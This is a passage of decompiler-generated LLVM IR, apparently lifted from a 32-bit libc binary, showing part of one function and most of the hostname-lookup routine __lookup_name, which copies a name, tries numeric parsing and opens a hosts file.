  %v1_804b9ff = add i32 %v8_804b9fa, ptrtoint (i32* @global_var_80544e0.349 to i32)
  store i32 %v1_804b9ff, i32* %ebp.global-to-local, align 4
  %v4_804ba0a = call i32 @memcmp(i8* %v3_804ba0a, i32 %v4_804b9f1, i32 %v0_804b9f8)
  %v1_804ba12 = icmp eq i32 %v4_804ba0a, 0
  %v1_804ba14 = icmp eq i1 %v1_804ba12, false
  br i1 %v1_804ba14, label %dec_label_pc_804b9f1.dec_label_pc_804ba2c_crit_edge, label %dec_label_pc_804ba16

dec_label_pc_804b9f1.dec_label_pc_804ba2c_crit_edge: ; preds = %dec_label_pc_804b9f1
  %v0_804ba30.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804ba2c

dec_label_pc_804ba16:                             ; preds = %dec_label_pc_804b9f1
  store i32 %v0_804b9e5, i32* @edx, align 4
  %v0_804ba1a = load i32, i32* @edi, align 4
  %v1_804ba1a = add i32 %v0_804ba1a, ptrtoint (i8** @global_var_80544f1.348 to i32)
  %v2_804ba1a = inttoptr i32 %v1_804ba1a to i8*
  %v3_804ba1a = load i8, i8* %v2_804ba1a, align 1
  %v6_804ba1a = and i32 %v4_804ba0a, -256
  %v3_804ba20 = load i32, i32* @ebx, align 4
  %v4_804ba20 = add i32 %v3_804ba20, %v0_804b9e5
  %v5_804ba20 = inttoptr i32 %v4_804ba20 to i8*
  %v6_804ba20 = load i8, i8* %v5_804ba20, align 1
  %v7_804ba20 = and i8 %v6_804ba20, %v3_804ba1a
  %v13_804ba20 = zext i8 %v7_804ba20 to i32
  %v16_804ba20 = or i32 %v13_804ba20, %v6_804ba1a
  %v3_804ba23 = load i32, i32* @esi, align 4
  %v4_804ba23 = add i32 %v3_804ba20, ptrtoint (i32* @global_var_80544e0.349 to i32)
  %v5_804ba23 = add i32 %v4_804ba23, %v3_804ba23
  %v6_804ba23 = inttoptr i32 %v5_804ba23 to i8*
  %v7_804ba23 = load i8, i8* %v6_804ba23, align 1
  %v18_804ba23 = icmp eq i8 %v7_804ba20, %v7_804ba23
  br i1 %v18_804ba23, label %dec_label_pc_804ba35, label %dec_label_pc_804ba2c

dec_label_pc_804ba2c:                             ; preds = %dec_label_pc_804b9f1.dec_label_pc_804ba2c_crit_edge, %dec_label_pc_804ba16
  %v0_804ba30 = phi i32 [ %v0_804ba1a, %dec_label_pc_804ba16 ], [ %v0_804ba30.pre, %dec_label_pc_804b9f1.dec_label_pc_804ba2c_crit_edge ]
  %v0_804b9f83 = phi i32 [ %v16_804ba20, %dec_label_pc_804ba16 ], [ %v4_804ba0a, %dec_label_pc_804b9f1.dec_label_pc_804ba2c_crit_edge ]
  %v4_804ba2c = trunc i64 %stack_var_-20.0 to i32
  %v5_804ba2c = add i32 %v4_804ba2c, 1
  %v22_804ba2c = sext i32 %v5_804ba2c to i64
  %v1_804ba30 = add i32 %v0_804ba30, 20
  store i32 %v1_804ba30, i32* @edi, align 4
  br label %dec_label_pc_804b9f1

dec_label_pc_804ba35:                             ; preds = %dec_label_pc_804ba16
  %v0_804ba38 = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v0_804b9e0, i32* @esi, align 4
  store i32 %v0_804b9dd, i32* @edi, align 4
  ret i32 %v0_804ba38

; uselistorder directives
  uselistorder i32 %v1_804ba30, { 1, 0 }
  uselistorder i32 %v3_804ba20, { 1, 0 }
  uselistorder i32 %v4_804ba0a, { 2, 0, 1 }
  uselistorder i32 %v0_804b9e5, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_804ba2c, { 1, 0 }
}

define i32 @__lookup_name(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %tmp = trunc i32 %arg5 to i8
  %tmp120 = call i8 @__decompiler_undefined_function_4()
  %tmp121 = call i64 @__decompiler_undefined_function_2()
  %stack_var_4 = alloca i8*, align 4
  store i8* %arg1, i8** %stack_var_4, align 4
  %stack_var_8 = alloca i8*, align 4
  %tmp135 = inttoptr i32 %arg2 to i8*
  store i8* %tmp135, i8** %stack_var_8, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-1444 = alloca i32, align 4
  %stack_var_-68 = alloca i8*, align 4
  %stack_var_-2468 = alloca i32, align 4
  %stack_var_-883 = alloca i32, align 4
  %stack_var_-884 = alloca i32, align 4
  %stack_var_-372 = alloca i32, align 4
  %stack_var_-3500 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-3564 = alloca i8*, align 4
  %stack_var_-3556 = alloca i8*, align 4
  %stack_var_-3548 = alloca i32, align 4
  %v0_804ba3f = load i32, i32* @ebp, align 4
  %v0_804ba40 = load i32, i32* @edi, align 4
  %v0_804ba41 = load i32, i32* @esi, align 4
  %v0_804ba42 = load i32, i32* @ebx, align 4
  %v15_804ba43 = ptrtoint i32* %stack_var_-3548 to i32
  store i32 %arg3, i32* @esi, align 4
  %v3_804ba50 = load i8*, i8** %stack_var_8, align 4
  %v4_804ba50 = ptrtoint i8* %v3_804ba50 to i32
  store i32 %v4_804ba50, i32* %eax.global-to-local, align 4
  store i32 %arg4, i32* @ebp, align 4
  %v1_804ba5e = icmp eq i32 %arg3, 0
  store i1 %v1_804ba5e, i1* %zf.global-to-local, align 1
  store i8 0, i8* %v3_804ba50, align 1
  %v0_804ba63 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_804ba63, label %dec_label_pc_804baa2, label %dec_label_pc_804ba65

dec_label_pc_804ba65:                             ; preds = %entry
  %v0_804ba65 = load i32, i32* @edi, align 4
  %v5_804ba65 = inttoptr i32 %v0_804ba65 to i8*
  store i8* %v5_804ba65, i8** %stack_var_-3556, align 4
  %v0_804ba6c = load i32, i32* @esi, align 4
  %v5_804ba6c = inttoptr i32 %v0_804ba6c to i8*
  store i8* %v5_804ba6c, i8** %stack_var_-3564, align 4
  %v3_804ba6d = call i32 @strnlen(i32 %v0_804ba6c, i32 255)
  store i32 %v3_804ba6d, i32* %edx.global-to-local, align 4
  %v1_804ba7f = add i32 %v3_804ba6d, -1
  store i32 %v1_804ba7f, i32* %eax.global-to-local, align 4
  %v9_804ba82 = icmp eq i32 %v3_804ba6d, 254
  store i1 %v9_804ba82, i1* %zf.global-to-local, align 1
  %v6_804ba87 = icmp ugt i32 %v1_804ba7f, 253
  br i1 %v6_804ba87, label %dec_label_pc_804c261, label %dec_label_pc_804ba8d

dec_label_pc_804ba8d:                             ; preds = %dec_label_pc_804ba65
  %v1_804ba8d = add i32 %v3_804ba6d, 1
  store i32 %v1_804ba8d, i32* %eax.global-to-local, align 4
  %v5_804ba91 = inttoptr i32 %v1_804ba8d to i8*
  store i8* %v5_804ba91, i8** %stack_var_-3556, align 4
  %v0_804ba92 = load i32, i32* @esi, align 4
  %tmp180 = bitcast i8** %stack_var_-3564 to i32*
  store i32 %v4_804ba50, i32* %tmp180, align 4
  %v6_804ba9a = call i32 @memcpy(i8* %v3_804ba50, i32 %v0_804ba92, i32 %v1_804ba8d)
  store i32 %v6_804ba9a, i32* %eax.global-to-local, align 4
  %v0_804ba9f = load i32, i32* @esp, align 4
  %v6_804ba9f = icmp eq i32 %v0_804ba9f, -16
  store i1 %v6_804ba9f, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804baa2

dec_label_pc_804baa2:                             ; preds = %entry, %dec_label_pc_804ba8d
  %v4_804baa2 = and i8 %tmp, 8
  %v5_804baa2 = icmp eq i8 %v4_804baa2, 0
  store i1 %v5_804baa2, i1* %zf.global-to-local, align 1
  br i1 %v5_804baa2, label %dec_label_pc_804babe, label %dec_label_pc_804baac

dec_label_pc_804baac:                             ; preds = %dec_label_pc_804baa2
  %v0_804baac = load i32, i32* @ebp, align 4
  %v9_804baac = icmp eq i32 %v0_804baac, 10
  store i1 %v9_804baac, i1* %zf.global-to-local, align 1
  %v1_804baaf = icmp eq i1 %v9_804baac, false
  br i1 %v1_804baaf, label %dec_label_pc_804bab6, label %dec_label_pc_804bab1

dec_label_pc_804bab1:                             ; preds = %dec_label_pc_804baac
  store i1 true, i1* %zf.global-to-local, align 1
  %v12_804bab1 = and i32 %v0_804baac, -65536
  store i32 %v12_804bab1, i32* @ebp, align 4
  br label %dec_label_pc_804babe

dec_label_pc_804bab6:                             ; preds = %dec_label_pc_804baac
  %sext = mul i32 %arg5, 16777216
  %v4_804bab6 = sdiv i32 %sext, 16777216
  %v5_804bab6 = add nsw i32 %v4_804bab6, -8
  %v13_804bab6 = icmp eq i32 %v5_804bab6, 0
  store i1 %v13_804bab6, i1* %zf.global-to-local, align 1
  %v15_804bab6 = trunc i32 %v5_804bab6 to i8
  br label %dec_label_pc_804babe

dec_label_pc_804babe:                             ; preds = %dec_label_pc_804baa2, %dec_label_pc_804bab1, %dec_label_pc_804bab6
  %stack_var_20.0 = phi i8 [ %tmp, %dec_label_pc_804baa2 ], [ %v15_804bab6, %dec_label_pc_804bab6 ], [ %tmp, %dec_label_pc_804bab1 ]
  %v0_804babe = load i32, i32* @esi, align 4
  %v1_804babe = icmp eq i32 %v0_804babe, 0
  store i1 %v1_804babe, i1* %zf.global-to-local, align 1
  %v1_804bac0 = icmp eq i1 %v1_804babe, false
  br i1 %v1_804bac0, label %dec_label_pc_804babe.dec_label_pc_804bbf4_crit_edge, label %dec_label_pc_804bac6

dec_label_pc_804babe.dec_label_pc_804bbf4_crit_edge: ; preds = %dec_label_pc_804babe
  %v3_804bbf4.pre = load i8*, i8** %stack_var_4, align 4
  br label %dec_label_pc_804bbf4

dec_label_pc_804bac6:                             ; preds = %dec_label_pc_804babe
  %v4_804bac6 = urem i8 %stack_var_20.0, 2
  %v5_804bac6 = icmp eq i8 %v4_804bac6, 0
  store i32 0, i32* @ebx, align 4
  %v0_804bb4c = load i32, i32* @ebp, align 4
  %v9_804bb4c = icmp eq i32 %v0_804bb4c, 10
  store i1 %v9_804bb4c, i1* %zf.global-to-local, align 1
  br i1 %v5_804bac6, label %dec_label_pc_804bb4a, label %dec_label_pc_804bad0

dec_label_pc_804bad0:                             ; preds = %dec_label_pc_804bac6
  br i1 %v9_804bb4c, label %dec_label_pc_804bb18, label %dec_label_pc_804bad7

dec_label_pc_804bad7:                             ; preds = %dec_label_pc_804bad0
  store i1 false, i1* @df, align 1
  store i32 %v0_804babe, i32* %eax.global-to-local, align 4
  %v2_804bada = ptrtoint i32* %stack_var_-152 to i32
  %v6_804bae1 = add i32 %v2_804bada, 4
  store i32 %v6_804bae1, i32* %edi.global-to-local, align 4
  store i32 2, i32* %stack_var_-152, align 4
  %v2_804baed = inttoptr i32 %v6_804bae1 to i32*
  store i32 %v0_804babe, i32* %v2_804baed, align 4
  %v3_804baed = load i32, i32* %edi.global-to-local, align 4
  %v6_804baed = add i32 %v3_804baed, 4
  store i32 %v6_804baed, i32* %edi.global-to-local, align 4
  %v0_804baee = load i32, i32* %eax.global-to-local, align 4
  %v2_804baee = inttoptr i32 %v6_804baed to i32*
  store i32 %v0_804baee, i32* %v2_804baee, align 4
  %v3_804baee = load i32, i32* %edi.global-to-local, align 4
  %v6_804baee = add i32 %v3_804baee, 4
  store i32 %v6_804baee, i32* %edi.global-to-local, align 4
  %v0_804baef = load i32, i32* %eax.global-to-local, align 4
  %v2_804baef = inttoptr i32 %v6_804baee to i32*
  store i32 %v0_804baef, i32* %v2_804baef, align 4
  %v3_804baef = load i32, i32* %edi.global-to-local, align 4
  %v6_804baef = add i32 %v3_804baef, 4
  store i32 %v6_804baef, i32* %edi.global-to-local, align 4
  %v0_804baf0 = load i32, i32* %eax.global-to-local, align 4
  %v2_804baf0 = inttoptr i32 %v6_804baef to i32*
  store i32 %v0_804baf0, i32* %v2_804baf0, align 4
  %v3_804baf0 = load i32, i32* %edi.global-to-local, align 4
  %v6_804baf0 = add i32 %v3_804baf0, 4
  store i32 %v6_804baf0, i32* %edi.global-to-local, align 4
  %v0_804baf1 = load i32, i32* %eax.global-to-local, align 4
  %v2_804baf1 = inttoptr i32 %v6_804baf0 to i32*
  store i32 %v0_804baf1, i32* %v2_804baf1, align 4
  %v3_804baf1 = load i32, i32* %edi.global-to-local, align 4
  %v6_804baf1 = add i32 %v3_804baf1, 4
  store i32 %v6_804baf1, i32* %edi.global-to-local, align 4
  %v0_804baf2 = load i32, i32* %eax.global-to-local, align 4
  %v2_804baf2 = inttoptr i32 %v6_804baf1 to i32*
  store i32 %v0_804baf2, i32* %v2_804baf2, align 4
  %v3_804baf2 = load i32, i32* %edi.global-to-local, align 4
  %v6_804baf2 = add i32 %v3_804baf2, 4
  store i32 %v6_804baf2, i32* @edi, align 4
  store i32 %v2_804bada, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 28 to i8*), i8** %stack_var_-3556, align 4
  %tmp181 = bitcast i8** %stack_var_4 to i32*
  %v3_804bafe11 = load i32, i32* %tmp181, align 4
  %tmp182 = bitcast i8** %stack_var_-3564 to i32*
  store i32 %v3_804bafe11, i32* %tmp182, align 4
  %v0_804bb05.cast = inttoptr i32 %v3_804bafe11 to i8*
  %v6_804bb05 = call i32 @memcpy(i8* %v0_804bb05.cast, i32 %v2_804bada, i32 28)
  store i32 %v6_804bb05, i32* %eax.global-to-local, align 4
  %v0_804bb0d = load i32, i32* @ebp, align 4
  %v9_804bb0d = icmp eq i32 %v0_804bb0d, 2
  store i1 %v9_804bb0d, i1* %zf.global-to-local, align 1
  br i1 %v9_804bb0d, label %dec_label_pc_804bf4a, label %dec_label_pc_804bb16

dec_label_pc_804bb16:                             ; preds = %dec_label_pc_804bad7
  %v0_804bb16 = load i32, i32* @ebx, align 4
  %v1_804bb16 = and i32 %v0_804bb16, -256
  %v2_804bb16 = or i32 %v1_804bb16, 1
  store i32 %v2_804bb16, i32* @ebx, align 4
  br label %dec_label_pc_804bb18

dec_label_pc_804bb18:                             ; preds = %dec_label_pc_804bad0, %dec_label_pc_804bb16
  store i1 false, i1* @df, align 1
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804bb1b = ptrtoint i32* %stack_var_-180 to i32
  %v6_804bb22 = add i32 %v2_804bb1b, 4
  store i32 %v6_804bb22, i32* %edi.global-to-local, align 4
  store i32 %v2_804bb1b, i32* %edx.global-to-local, align 4
  store i32 10, i32* %stack_var_-180, align 4
  %v2_804bb35 = inttoptr i32 %v6_804bb22 to i32*
  store i32 0, i32* %v2_804bb35, align 4
  %v3_804bb35 = load i32, i32* %edi.global-to-local, align 4
  %v6_804bb35 = add i32 %v3_804bb35, 4
  store i32 %v6_804bb35, i32* %edi.global-to-local, align 4
  %v0_804bb36 = load i32, i32* %eax.global-to-local, align 4
  %v2_804bb36 = inttoptr i32 %v6_804bb35 to i32*
  store i32 %v0_804bb36, i32* %v2_804bb36, align 4
  %v3_804bb36 = load i32, i32* %edi.global-to-local, align 4
  %v6_804bb36 = add i32 %v3_804bb36, 4
  store i32 %v6_804bb36, i32* %edi.global-to-local, align 4
  %v0_804bb37 = load i32, i32* %eax.global-to-local, align 4
  %v2_804bb37 = inttoptr i32 %v6_804bb36 to i32*
  store i32 %v0_804bb37, i32* %v2_804bb37, align 4
  %v3_804bb37 = load i32, i32* %edi.global-to-local, align 4
  %v6_804bb37 = add i32 %v3_804bb37, 4
  store i32 %v6_804bb37, i32* %edi.global-to-local, align 4
  %v0_804bb38 = load i32, i32* %eax.global-to-local, align 4
  %v2_804bb38 = inttoptr i32 %v6_804bb37 to i32*
  store i32 %v0_804bb38, i32* %v2_804bb38, align 4
  %v3_804bb38 = load i32, i32* %edi.global-to-local, align 4
  %v6_804bb38 = add i32 %v3_804bb38, 4
  store i32 %v6_804bb38, i32* %edi.global-to-local, align 4
  %v0_804bb39 = load i32, i32* %eax.global-to-local, align 4
  %v2_804bb39 = inttoptr i32 %v6_804bb38 to i32*
  store i32 %v0_804bb39, i32* %v2_804bb39, align 4
  %v3_804bb39 = load i32, i32* %edi.global-to-local, align 4
  %v6_804bb39 = add i32 %v3_804bb39, 4
  store i32 %v6_804bb39, i32* %edi.global-to-local, align 4
  %v0_804bb3a = load i32, i32* %eax.global-to-local, align 4
  %v2_804bb3a = inttoptr i32 %v6_804bb39 to i32*
  store i32 %v0_804bb3a, i32* %v2_804bb3a, align 4
  %v3_804bb3a = load i32, i32* %edi.global-to-local, align 4
  %v6_804bb3a = add i32 %v3_804bb3a, 4
  store i32 %v6_804bb3a, i32* @edi, align 4
  %v1_804bb3b = load i32, i32* @ebx, align 4
  %v3_804bb3b = mul i32 %v1_804bb3b, 28
  store i32 %v3_804bb3b, i32* %eax.global-to-local, align 4
  %v4_804bb3e = load i8*, i8** %stack_var_4, align 4
  %v5_804bb3e = ptrtoint i8* %v4_804bb3e to i32
  %v6_804bb3e = add i32 %v5_804bb3e, %v3_804bb3b
  br label %dec_label_pc_804bbd7

dec_label_pc_804bb4a:                             ; preds = %dec_label_pc_804bac6
  br i1 %v9_804bb4c, label %dec_label_pc_804bba2, label %dec_label_pc_804bb51

dec_label_pc_804bb51:                             ; preds = %dec_label_pc_804bb4a
  store i1 false, i1* @df, align 1
  store i32 %v0_804babe, i32* %eax.global-to-local, align 4
  %v2_804bb54 = ptrtoint i32* %stack_var_-208 to i32
  %v6_804bb5b = add i32 %v2_804bb54, 4
  store i32 %v6_804bb5b, i32* %edi.global-to-local, align 4
  store i32 2, i32* %stack_var_-208, align 4
  %v2_804bb67 = inttoptr i32 %v6_804bb5b to i32*
  store i32 %v0_804babe, i32* %v2_804bb67, align 4
  %v3_804bb67 = load i32, i32* %edi.global-to-local, align 4
  %v6_804bb67 = add i32 %v3_804bb67, 4
  store i32 %v6_804bb67, i32* %edi.global-to-local, align 4
  %v0_804bb68 = load i32, i32* %eax.global-to-local, align 4
  %v2_804bb68 = inttoptr i32 %v6_804bb67 to i32*
  store i32 %v0_804bb68, i32* %v2_804bb68, align 4
  %v3_804bb68 = load i32, i32* %edi.global-to-local, align 4
  %v6_804bb68 = add i32 %v3_804bb68, 4
  store i32 %v6_804bb68, i32* %edi.global-to-local, align 4
  %v0_804bb79 = load i32, i32* %eax.global-to-local, align 4
  %v2_804bb79 = inttoptr i32 %v6_804bb68 to i32*
  store i32 %v0_804bb79, i32* %v2_804bb79, align 4
  %v3_804bb79 = load i32, i32* %edi.global-to-local, align 4
  %v6_804bb79 = add i32 %v3_804bb79, 4
  store i32 %v6_804bb79, i32* %edi.global-to-local, align 4
  %v0_804bb7a = load i32, i32* %eax.global-to-local, align 4
  %v2_804bb7a = inttoptr i32 %v6_804bb79 to i32*
  store i32 %v0_804bb7a, i32* %v2_804bb7a, align 4
  %v3_804bb7a = load i32, i32* %edi.global-to-local, align 4
  %v6_804bb7a = add i32 %v3_804bb7a, 4
  store i32 %v6_804bb7a, i32* %edi.global-to-local, align 4
  %v0_804bb7b = load i32, i32* %eax.global-to-local, align 4
  %v2_804bb7b = inttoptr i32 %v6_804bb7a to i32*
  store i32 %v0_804bb7b, i32* %v2_804bb7b, align 4
  %v3_804bb7b = load i32, i32* %edi.global-to-local, align 4
  %v6_804bb7b = add i32 %v3_804bb7b, 4
  store i32 %v6_804bb7b, i32* %edi.global-to-local, align 4
  %v0_804bb7c = load i32, i32* %eax.global-to-local, align 4
  %v2_804bb7c = inttoptr i32 %v6_804bb7b to i32*
  store i32 %v0_804bb7c, i32* %v2_804bb7c, align 4
  %v3_804bb7c = load i32, i32* %edi.global-to-local, align 4
  %v6_804bb7c = add i32 %v3_804bb7c, 4
  store i32 %v6_804bb7c, i32* @edi, align 4
  store i32 %v2_804bb54, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 28 to i8*), i8** %stack_var_-3556, align 4
  %tmp183 = bitcast i8** %stack_var_4 to i32*
  %v3_804bb8823 = load i32, i32* %tmp183, align 4
  %tmp184 = bitcast i8** %stack_var_-3564 to i32*
  store i32 %v3_804bb8823, i32* %tmp184, align 4
  %v0_804bb8f.cast = inttoptr i32 %v3_804bb8823 to i8*
  %v6_804bb8f = call i32 @memcpy(i8* %v0_804bb8f.cast, i32 %v2_804bb54, i32 28)
  store i32 %v6_804bb8f, i32* %eax.global-to-local, align 4
  %v0_804bb97 = load i32, i32* @ebp, align 4
  %v9_804bb97 = icmp eq i32 %v0_804bb97, 2
  store i1 %v9_804bb97, i1* %zf.global-to-local, align 1
  br i1 %v9_804bb97, label %dec_label_pc_804bf4a, label %dec_label_pc_804bba0

dec_label_pc_804bba0:                             ; preds = %dec_label_pc_804bb51
  %v0_804bba0 = load i32, i32* @ebx, align 4
  %v1_804bba0 = and i32 %v0_804bba0, -256
  %v2_804bba0 = or i32 %v1_804bba0, 1
  store i32 %v2_804bba0, i32* @ebx, align 4
  br label %dec_label_pc_804bba2

dec_label_pc_804bba2:                             ; preds = %dec_label_pc_804bb4a, %dec_label_pc_804bba0
  store i1 false, i1* @df, align 1
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804bba5 = ptrtoint i32* %stack_var_-236 to i32
  %v6_804bbac = add i32 %v2_804bba5, 4
  store i32 %v6_804bbac, i32* %edi.global-to-local, align 4
  store i32 %v2_804bba5, i32* %edx.global-to-local, align 4
  store i32 10, i32* %stack_var_-236, align 4
  %v2_804bbbf = inttoptr i32 %v6_804bbac to i32*
  store i32 0, i32* %v2_804bbbf, align 4
  %v3_804bbbf = load i32, i32* %edi.global-to-local, align 4
  %v6_804bbbf = add i32 %v3_804bbbf, 4
  store i32 %v6_804bbbf, i32* %edi.global-to-local, align 4
  %v0_804bbc0 = load i32, i32* %eax.global-to-local, align 4
  %v2_804bbc0 = inttoptr i32 %v6_804bbbf to i32*
  store i32 %v0_804bbc0, i32* %v2_804bbc0, align 4
  %v3_804bbc0 = load i32, i32* %edi.global-to-local, align 4
  %v6_804bbc0 = add i32 %v3_804bbc0, 4
  store i32 %v6_804bbc0, i32* %edi.global-to-local, align 4
  %v0_804bbc1 = load i32, i32* %eax.global-to-local, align 4
  %v2_804bbc1 = inttoptr i32 %v6_804bbc0 to i32*
  store i32 %v0_804bbc1, i32* %v2_804bbc1, align 4
  %v3_804bbc1 = load i32, i32* %edi.global-to-local, align 4
  %v6_804bbc1 = add i32 %v3_804bbc1, 4
  store i32 %v6_804bbc1, i32* %edi.global-to-local, align 4
  %v0_804bbc2 = load i32, i32* %eax.global-to-local, align 4
  %v2_804bbc2 = inttoptr i32 %v6_804bbc1 to i32*
  store i32 %v0_804bbc2, i32* %v2_804bbc2, align 4
  %v3_804bbc2 = load i32, i32* %edi.global-to-local, align 4
  %v6_804bbc2 = add i32 %v3_804bbc2, 4
  store i32 %v6_804bbc2, i32* %edi.global-to-local, align 4
  %v0_804bbc3 = load i32, i32* %eax.global-to-local, align 4
  %v2_804bbc3 = inttoptr i32 %v6_804bbc2 to i32*
  store i32 %v0_804bbc3, i32* %v2_804bbc3, align 4
  %v3_804bbc3 = load i32, i32* %edi.global-to-local, align 4
  %v6_804bbc3 = add i32 %v3_804bbc3, 4
  store i32 %v6_804bbc3, i32* %edi.global-to-local, align 4
  %v0_804bbcc = load i32, i32* %eax.global-to-local, align 4
  %v2_804bbcc = inttoptr i32 %v6_804bbc3 to i32*
  store i32 %v0_804bbcc, i32* %v2_804bbcc, align 4
  %v3_804bbcc = load i32, i32* %edi.global-to-local, align 4
  %v6_804bbcc = add i32 %v3_804bbcc, 4
  store i32 %v6_804bbcc, i32* @edi, align 4
  %v1_804bbcd = load i32, i32* @ebx, align 4
  %v3_804bbcd = mul i32 %v1_804bbcd, 28
  store i32 %v3_804bbcd, i32* %eax.global-to-local, align 4
  %v4_804bbd0 = load i8*, i8** %stack_var_4, align 4
  %v5_804bbd0 = ptrtoint i8* %v4_804bbd0 to i32
  %v6_804bbd0 = add i32 %v5_804bbd0, %v3_804bbcd
  br label %dec_label_pc_804bbd7

dec_label_pc_804bbd7:                             ; preds = %dec_label_pc_804bb18, %dec_label_pc_804bba2
  %v3_804bbf473 = phi i8* [ %v4_804bbd0, %dec_label_pc_804bba2 ], [ %v4_804bb3e, %dec_label_pc_804bb18 ]
  %v0_804bbd8 = phi i32 [ %v1_804bbcd, %dec_label_pc_804bba2 ], [ %v1_804bb3b, %dec_label_pc_804bb18 ]
  %storemerge52.in = phi i32 [ %v6_804bbd0, %dec_label_pc_804bba2 ], [ %v6_804bb3e, %dec_label_pc_804bb18 ]
  store i32 %storemerge52.in, i32* %eax.global-to-local, align 4
  %v1_804bbd8 = add i32 %v0_804bbd8, 1
  %v8_804bbd8 = icmp eq i32 %v1_804bbd8, 0
  store i1 %v8_804bbd8, i1* %zf.global-to-local, align 1
  store i32 %v1_804bbd8, i32* @ebx, align 4
  store i8* inttoptr (i32 28 to i8*), i8** %stack_var_-3556, align 4
  %v0_804bbdb = load i32, i32* %edx.global-to-local, align 4
  %v5_804bbdc = inttoptr i32 %storemerge52.in to i8*
  store i8* %v5_804bbdc, i8** %stack_var_-3564, align 4
  %v6_804bbdd = call i32 @memcpy(i8* %v5_804bbdc, i32 %v0_804bbdb, i32 28)
  store i32 %v6_804bbdd, i32* %eax.global-to-local, align 4
  %v0_804bbe2 = load i32, i32* @ebx, align 4
  %v5_804bbe9 = icmp eq i32 %v0_804bbe2, 0
  store i1 %v5_804bbe9, i1* %zf.global-to-local, align 1
  %v1_804bbee = icmp eq i1 %v5_804bbe9, false
  br i1 %v1_804bbee, label %dec_label_pc_804bf30, label %dec_label_pc_804bbd7.dec_label_pc_804bbf4_crit_edge

dec_label_pc_804bbd7.dec_label_pc_804bbf4_crit_edge: ; preds = %dec_label_pc_804bbd7
  %v0_804bbfd.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804bbf4

dec_label_pc_804bbf4:                             ; preds = %dec_label_pc_804bbd7.dec_label_pc_804bbf4_crit_edge, %dec_label_pc_804babe.dec_label_pc_804bbf4_crit_edge
  %v0_804bbfd = phi i32 [ %v0_804babe, %dec_label_pc_804babe.dec_label_pc_804bbf4_crit_edge ], [ %v0_804bbfd.pre, %dec_label_pc_804bbd7.dec_label_pc_804bbf4_crit_edge ]
  %v3_804bbf4 = phi i8* [ %v3_804bbf4.pre, %dec_label_pc_804babe.dec_label_pc_804bbf4_crit_edge ], [ %v3_804bbf473, %dec_label_pc_804bbd7.dec_label_pc_804bbf4_crit_edge ]
  %v4_804bbf4 = ptrtoint i8* %v3_804bbf4 to i32
  store i32 %v4_804bbf4, i32* @eax, align 4
  %v0_804bbfb = load i32, i32* @ebp, align 4
  store i32 %v0_804bbfb, i32* @ecx, align 4
  store i32 %v0_804bbfd, i32* @edx, align 4
  %v0_804bbff = call i32 @name_from_numeric()
  store i32 %v0_804bbff, i32* %eax.global-to-local, align 4
  %v1_804bc04 = icmp eq i32 %v0_804bbff, 0
  store i1 %v1_804bc04, i1* %zf.global-to-local, align 1
  %v1_804bc0a = icmp eq i1 %v1_804bc04, false
  br i1 %v1_804bc0a, label %dec_label_pc_804bf30, label %dec_label_pc_804bc10

dec_label_pc_804bc10:                             ; preds = %dec_label_pc_804bbf4
  %v4_804bc10 = and i8 %stack_var_20.0, 4
  %v5_804bc10 = icmp eq i8 %v4_804bc10, 0
  store i1 %v5_804bc10, i1* %zf.global-to-local, align 1
  %v1_804bc18 = icmp eq i1 %v5_804bc10, false
  br i1 %v1_804bc18, label %dec_label_pc_804bf3d, label %dec_label_pc_804bc1e

dec_label_pc_804bc1e:                             ; preds = %dec_label_pc_804bc10
  %v0_804bc1e = load i32, i32* @esp, align 4
  %v9_804bc1e = icmp eq i32 %v0_804bc1e, 12
  store i1 %v9_804bc1e, i1* %zf.global-to-local, align 1
  %v0_804bc21 = load i32, i32* @esi, align 4
  %v5_804bc21 = inttoptr i32 %v0_804bc21 to i8*
  store i8* %v5_804bc21, i8** %stack_var_-3564, align 4
  %v6_804bc21 = ptrtoint i8** %stack_var_-3564 to i32
  %v3_804bc22 = call i32 @strlen(i8* %v5_804bc21)
  %v2_804bc30 = ptrtoint i32* %stack_var_-3500 to i32
  %v2_804bc35 = ptrtoint i32* %stack_var_-372 to i32
  store i32 %v2_804bc35, i32* %eax.global-to-local, align 4
  %v6_804bc42 = call i32 @__fopen_rb_ca(i32 ptrtoint ([11 x i8]* @global_var_80544c4.350 to i32), i32* nonnull %stack_var_-372, i32 %v2_804bc30, i32 1032)
  store i32 %v6_804bc42, i32* %eax.global-to-local, align 4
  %v1_804bc4e = icmp eq i32 %v6_804bc42, 0
  store i1 %v1_804bc4e, i1* %zf.global-to-local, align 1
  %v1_804bc50 = icmp eq i1 %v1_804bc4e, false
  br i1 %v1_804bc50, label %dec_label_pc_804bd60.preheader, label %dec_label_pc_804bda3

dec_label_pc_804bd60.preheader:                   ; preds = %dec_label_pc_804bc1e
  %v8_804bd61 = inttoptr i32 %v6_804bc42 to i8*
  %v2_804bd6a = ptrtoint i32* %stack_var_-884 to i32
  %tmp185 = bitcast i32* %stack_var_-884 to i8*
  %v2_804bc7a = ptrtoint i32* %stack_var_-883 to i32
